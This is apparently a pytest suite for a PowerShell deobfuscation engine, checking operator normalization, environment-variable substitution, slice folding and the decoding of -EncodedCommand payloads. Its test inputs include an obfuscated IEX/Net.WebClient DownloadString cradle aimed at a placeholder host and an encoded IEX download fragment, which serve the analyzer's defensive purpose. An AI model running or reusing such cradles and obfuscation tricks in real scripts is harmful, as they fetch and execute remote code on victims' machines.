"""
M3 · Content Pass — regression tests.

Verifies:
  * Every declared transformation fires on canonical inputs.
  * Quoted content is NEVER modified (Base64, EncodedCommand, DQ
    interpolation strings, bash strings all pass through).
  * Idempotence — running twice yields identical output.
  * Determinism — identical input always produces identical output.
  * Transformation metadata is well-formed.
  * S01 anchor: `-EncodedCommand` normalizes to `-encodedcommand`
    without corrupting the encoded payload.
  * S013 anchor: env-var substitution + slice folding + subsequent
    structural join produce the intended intermediate reconstruction.
"""
from __future__ import annotations

import pytest

from workspace.convergence import Artifact, converge
from workspace.convergence.content import TRANSFORMATIONS
from workspace.convergence.content import run as content_run


def _run(payload: str) -> tuple[str, tuple[str, ...], bool]:
    art, record = content_run(Artifact.from_input(payload))
    return art.content, record.transformations, record.changed


# ─── Transformation registry sanity ─────────────────────────────────


class TestTransformationRegistry:
    def test_every_transformation_declares_metadata(self) -> None:
        for xf in TRANSFORMATIONS:
            assert xf.name.startswith("content-")
            assert xf.category == "content"
            assert xf.consumes
            assert xf.produces
            assert xf.preconditions
            assert xf.postconditions
            assert xf.deterministic is True
            assert xf.apply is not None

    def test_registry_names_are_unique(self) -> None:
        names = [x.name for x in TRANSFORMATIONS]
        assert len(names) == len(set(names))

    def test_registry_to_dict_serializes(self) -> None:
        for xf in TRANSFORMATIONS:
            d = xf.to_dict()
            assert d["name"] == xf.name
            assert d["deterministic"] is True


# ─── Operator case normalization ────────────────────────────────────


class TestOperatorCaseNormalize:
    def test_join_operator(self) -> None:
        out, _, _ = _run("$a -jOiN ''")
        assert out == "$a -join ''"

    def test_encoded_command_switch(self) -> None:
        out, _, _ = _run("powershell -EncodedCommand SQBFAF==")
        assert out == "powershell -encodedcommand SQBFAF=="

    def test_multiple_operators(self) -> None:
        out, _, _ = _run("$a -jOiN '' -SplIt ' ' -eNc")
        assert out == "$a -join '' -split ' ' -enc"

    def test_unknown_operator_untouched(self) -> None:
        """`-encod` is a valid PowerShell abbreviation but is NOT in
        the strict whitelist — we leave it alone rather than assume
        a canonical form."""
        payload = "powershell -encod SQBFAF=="
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_dashed_arg_value_untouched(self) -> None:
        """`-Command IEX(...)` — `Command` normalizes, but the value
        after must not."""
        out, _, _ = _run("powershell -Command IEX")
        assert out == "powershell -command IEX"


# ─── $env: case normalization ───────────────────────────────────────


class TestEnvVarCaseNormalize:
    def test_case_normalize_unknown_var(self) -> None:
        """Env vars NOT in the static defaults table only get case-
        normalized, not substituted."""
        out, _, _ = _run("$eNv:UnKnOwN")
        assert out == "$env:unknown"


# ─── $env: static substitution ──────────────────────────────────────


class TestEnvVarSubstitute:
    @pytest.mark.parametrize(
        "payload,expected",
        [
            ("$env:ComSpec", "'C:\\Windows\\system32\\cmd.exe'"),
            ("$env:Public", "'C:\\Users\\Public'"),
            ("$env:ProgramFiles", "'C:\\Program Files'"),
            ("$env:SystemRoot", "'C:\\Windows'"),
            ("$env:windir", "'C:\\Windows'"),
            ("$env:ProgramData", "'C:\\ProgramData'"),
        ],
    )
    def test_static_defaults(self, payload: str, expected: str) -> None:
        out, _, _ = _run(payload)
        assert out == expected

    def test_user_specific_vars_not_substituted(self) -> None:
        """USERPROFILE, USERNAME, APPDATA, TEMP, TMP, PATH etc. vary
        per user/host and must NOT be substituted."""
        for var in ("USERPROFILE", "USERNAME", "APPDATA", "TEMP", "TMP",
                    "PATH", "HOMEDRIVE", "COMPUTERNAME"):
            payload = f"$env:{var}"
            out, _, _ = _run(payload)
            # Case-normalize is allowed; substitution is NOT.
            assert out.lower() == payload.lower()
            assert "'" not in out


# ─── String index / slice folding ───────────────────────────────────


class TestStringIndexFolding:
    def test_single_index(self) -> None:
        out, _, _ = _run("'abc'[1]")
        assert out == "'b'"

    def test_negative_index(self) -> None:
        out, _, _ = _run("'abcdef'[-1]")
        assert out == "'f'"

    def test_range_ascending(self) -> None:
        out, _, _ = _run("'abcdef'[1..3]")
        assert out == "('b','c','d')"

    def test_range_descending(self) -> None:
        out, _, _ = _run("'abcdef'[3..1]")
        assert out == "('d','c','b')"

    def test_list_indices(self) -> None:
        out, _, _ = _run("'abcdef'[0,2,4]")
        assert out == "('a','c','e')"

    def test_out_of_bounds_untouched(self) -> None:
        payload = "'abc'[10]"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False


# ─── Backtick escape strip ──────────────────────────────────────────


class TestBacktickStrip:
    def test_identifier_backticks(self) -> None:
        out, _, _ = _run("I`E`X")
        assert out == "IEX"

    def test_powershell_backtick_split(self) -> None:
        out, _, _ = _run("pow`ershell")
        assert out == "powershell"

    def test_backtick_inside_sq_string_preserved(self) -> None:
        payload = "'a`b'"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_backtick_inside_dq_string_preserved(self) -> None:
        payload = '"a`nb"'  # PowerShell escape sequence for newline
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False


# ─── Numeric constant folding ───────────────────────────────────────


class TestNumericConstantFold:
    def test_simple_addition(self) -> None:
        out, _, _ = _run("50+55")
        assert out == "105"

    def test_simple_subtraction(self) -> None:
        out, _, _ = _run("50-30")
        assert out == "20"

    def test_chain_folds_through_engine(self) -> None:
        # Direct call folds pairwise; engine loop handles the chain.
        result = converge(Artifact.from_input("(1+2+3)"))
        assert result.final_artifact.content == "(6)"
        assert result.canonical is True

    def test_numeric_in_string_untouched(self) -> None:
        payload = "'50+55'"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_does_not_fold_variable_and_number(self) -> None:
        """`$x+5` must NOT be folded — `$x` is a variable, not an
        integer literal."""
        payload = "$x+5"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False


# ─── Quote-safety guarantees ────────────────────────────────────────


class TestQuoteSafety:
    @pytest.mark.parametrize(
        "payload",
        [
            "'$env:ComSpec is a literal here'",
            '"$env:ComSpec is interpolated here"',
            "'-jOiN inside single quotes'",
            '"I`E`X inside double quotes"',
            "'50+55 inside a string'",
        ],
    )
    def test_content_inside_strings_never_modified(self, payload: str) -> None:
        """Content inside quoted strings must never be modified."""
        out, _, changed = _run(payload)
        assert out == payload, f"quoted content changed: {payload!r} -> {out!r}"
        assert changed is False


# ─── Idempotence + determinism ──────────────────────────────────────


class TestIdempotenceAndDeterminism:
    @pytest.mark.parametrize(
        "payload",
        [
            "$env:ComSpec[4,15,25]",
            "'abcdef'[1..3]",
            "50+55",
            "I`E`X",
            "$a -jOiN ''",
        ],
    )
    def test_engine_result_stable(self, payload: str) -> None:
        a = converge(Artifact.from_input(payload))
        b = converge(Artifact.from_input(payload))
        assert a.final_artifact.content == b.final_artifact.content
        assert a.certificate.fingerprint == b.certificate.fingerprint


# ─── S01 & S013 corpus anchors ──────────────────────────────────────


def test_s01_encoded_command_decodes_to_canonical_script() -> None:
    """S01: `-EncodedCommand SQBFAFgA...` — M3 case-normalizes the
    switch, M4's decoder-powershell-encoded-command then extracts the
    payload, Base64-decodes, and UTF-16LE-decodes into the canonical
    PowerShell script."""
    payload = (
        "powershell -EncodedCommand "
        "SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4A"
    )
    result = converge(Artifact.from_input(payload))
    assert result.canonical is True
    # Decoded PowerShell script must appear in the artifact.
    out = result.final_artifact.content
    assert "IEX" in out
    assert "new-object" in out.lower()
    assert "net.webclient" in out.lower()
    # The encoded prefix and B64 payload have been consumed by the
    # decoder — they must NOT remain in the final artifact.
    assert "-encodedcommand" not in out
    assert "SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0" not in out


def test_s013_env_slice_reconstruction_progress() -> None:
    """S013: the env-var slicing / join / concatenation pipeline that
    obfuscators use to spell out `powershell`. After M3 the ComSpec
    slice ``[4,15,25]`` folds to ``('i','e','x')`` and the Public+PF
    ``[12]+[9]`` chain folds through M2 to ``'lm'``.

    Full end-to-end reconstruction to ``powershell -Command IEX (…)``
    requires M4 (decoder) + M5 (semantic), so this test only asserts
    the M3-visible intermediate results."""
    payload = (
        "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( "
        "$enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] "
        "+ $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + "
        "\" -cOmmAnD IEX (New-Object Net.WebClient)."
        "DownloadString('http://slicetest.local')\" )"
    )
    result = converge(Artifact.from_input(payload))
    assert result.canonical is True
    out = result.final_artifact.content
    # ComSpec was fully substituted then sliced to ('i','e','x').
    assert "('i','e','x')" in out
    # Public[12] + ProgramFiles[9] folded through M2 to 'lm'.
    assert "'lm'" in out
    # ComSpec substitute survived.
    assert "'C:\\Windows\\system32\\cmd.exe'" in out
    # The DQ string with `-cOmmAnD` and IOC was NOT touched.
    assert "http://slicetest.local" in out
